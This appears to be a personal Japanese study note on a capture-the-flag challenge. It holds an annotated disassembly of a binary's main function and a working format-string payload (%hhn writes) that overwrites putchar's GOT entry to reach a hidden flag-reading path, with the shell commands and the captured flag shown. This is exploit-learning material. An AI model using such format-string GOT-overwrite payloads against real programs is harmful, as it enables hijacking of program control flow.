# mainのみ抜き出して調べる

080485b4 <main>:
 80485b4:	55                   	push   ebp
 80485b5:	89 e5                	mov    ebp,esp
 80485b7:	83 e4 f0             	and    esp,0xfffffff0                               調べてもわからん
 80485ba:	81 ec 20 04 00 00    	sub    esp,0x420
 80485c0:	c7 04 24 a4 87 04 08 	mov    DWORD PTR [esp],0x80487a4
 80485c7:	e8 f8 fe ff ff       	call   80484c4 <puts@plt>                           出力
    80485cc:	a1 04 9a 04 08      mov    eax,ds:0x8049a04
 80485d1:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80485d5:	c7 44 24 04 00 04 00 	mov    DWORD PTR [esp+0x4],0x400
 80485dc:	00 
 80485dd:	8d 44 24 18          	lea    eax,[esp+0x18]
 80485e1:	89 04 24             	mov    DWORD PTR [esp],eax
 80485e4:	e8 9b fe ff ff       	call   8048484 <fgets@plt>                          入力受け取り
 80485e9:	c7 04 24 b6 87 04 08 	mov    DWORD PTR [esp],0x80487b6
 80485f0:	e8 bf fe ff ff       	call   80484b4 <printf@plt>
 80485f5:	8d 44 24 18          	lea    eax,[esp+0x18]
 80485f9:	89 04 24             	mov    DWORD PTR [esp],eax
 80485fc:	e8 b3 fe ff ff       	call   80484b4 <printf@plt>
 8048601:	c7 04 24 0a 00 00 00 	mov    DWORD PTR [esp],0xa
 8048608:	e8 67 fe ff ff       	call   8048474 <putchar@plt>                        ここで改行コード?  0x80499e0に飛んでいる           
 804860d:	c7 84 24 18 04 00 00 	mov    DWORD PTR [esp+0x418],0x1
 8048614:	01 00 00 00 
 8048618:	eb 67                	jmp    8048681 <main+0xcd>
 804861a:	c7 04 24 bb 87 04 08 	mov    DWORD PTR [esp],0x80487bb
 8048621:	e8 9e fe ff ff       	call   80484c4 <puts@plt>
 8048626:	a1 04 9a 04 08       	mov    eax,ds:0x8049a04
 804862b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 804862f:	c7 44 24 04 00 04 00 	mov    DWORD PTR [esp+0x4],0x400
 8048636:	00 
 8048637:	8d 44 24 18          	lea    eax,[esp+0x18]
 804863b:	89 04 24             	mov    DWORD PTR [esp],eax
 804863e:	e8 41 fe ff ff       	call   8048484 <fgets@plt>
 8048643:	85 c0                	test   eax,eax
 8048645:	0f 94 c0             	sete   al
 8048648:	84 c0                	test   al,al
 804864a:	74 0a                	je     8048656 <main+0xa2>
 804864c:	b8 00 00 00 00       	mov    eax,0x0
 8048651:	e9 86 00 00 00       	jmp    80486dc <main+0x128>                       ここでjmpしてる
 8048656:	c7 44 24 04 d1 87 04 	mov    DWORD PTR [esp+0x4],0x80487d1
 804865d:	08 
 804865e:	8d 44 24 18          	lea    eax,[esp+0x18]
 8048662:	89 04 24             	mov    DWORD PTR [esp],eax
 8048665:	e8 7a fe ff ff       	call   80484e4 <strcmp@plt>
 804866a:	85 c0                	test   eax,eax
 804866c:	75 13                	jne    8048681 <main+0xcd>
 804866e:	c7 04 24 d5 87 04 08 	mov    DWORD PTR [esp],0x80487d5
 8048675:	e8 4a fe ff ff       	call   80484c4 <puts@plt>
 804867a:	b8 00 00 00 00       	mov    eax,0x0
 804867f:	eb 5b                	jmp    80486dc <main+0x128>                        ここでjmpしてる
 8048681:	8b 84 24 18 04 00 00 	mov    eax,DWORD PTR [esp+0x418]
 8048688:	85 c0                	test   eax,eax
 804868a:	0f 95 c0             	setne  al
 804868d:	84 c0                	test   al,al
 804868f:	75 89                	jne    804861a <main+0x66>
 8048691:	c7 44 24 04 e6 87 04 	mov    DWORD PTR [esp+0x4],0x80487e6
 8048698:	08 
 8048699:	c7 04 24 e8 87 04 08 	mov    DWORD PTR [esp],0x80487e8
 80486a0:	e8 ff fd ff ff       	call   80484a4 <fopen@plt>                          fopenがあやしい
 80486a5:	89 84 24 1c 04 00 00 	mov    DWORD PTR [esp+0x41c],eax
 80486ac:	8b 84 24 1c 04 00 00 	mov    eax,DWORD PTR [esp+0x41c]
 80486b3:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80486b7:	c7 44 24 04 00 04 00 	mov    DWORD PTR [esp+0x4],0x400
 80486be:	00 
 80486bf:	8d 44 24 18          	lea    eax,[esp+0x18]
 80486c3:	89 04 24             	mov    DWORD PTR [esp],eax
 80486c6:	e8 b9 fd ff ff       	call   8048484 <fgets@plt>
 80486cb:	8d 44 24 18          	lea    eax,[esp+0x18]
 80486cf:	89 04 24             	mov    DWORD PTR [esp],eax
 80486d2:	e8 dd fd ff ff       	call   80484b4 <printf@plt>
 80486d7:	b8 00 00 00 00       	mov    eax,0x0
 80486dc:	c9                   	leave                                          jmp先がここ
 80486dd:	c3                   	ret    
 80486de:	90                   	nop
 80486df:	90                   	nop


 # 気づき
 - これはアセンブラ(マシン語と一対一対応している)
 - 80486dcは2つ登場
 - mov(命令、ニーモニック)代入を表す
 - レジスタ: eax,ebx,ecx,edx/esi,edi,ebp,esp,eip/cs,ds,ss,es,fs,gs/eflag
 - espレジスタはスタックの位置を指ししめす。
 - strcmp: 文字列比較

- putcharで飛ぶ先(0x80499e0)をfopen直前に変えてやれば良い
- jneは分岐を表すので、その直後の8048691からfopenの処理が始まっていると見る。
- `\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08%93c%6$hhn%223c%7$hhn%56c%8$hhn`
- これ違った(0抜けてた)
"""
[q4@localhost ~]$ echo -e '\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08%93c%6$hhn%223c%7$hhn%56c%8$hhn' | ./q4
What's your name?
Hi, ������                                                                                                                                                                                                                                                                                                                          �                                                       
Segmentation fault
[q4@localhost ~]$ echo -e '\xe0\x99\x04\x08\xe1\x99\x04\x08\xe2\x99\x04\x08\xe3\x99\x04\x08%129c%6$hhn%245c%7$hhn%126c%8$hhn%4c%9$hhn' | ./q4
What's your name?
Hi, ��������                                                                                                                                                                                                                                                                                                                                                                                    �                                                                                                                               
FLAG_nwW6eP503Q3QI0zw

"""





http://inaz2.hatenablog.com/entry/2014/04/20/041453
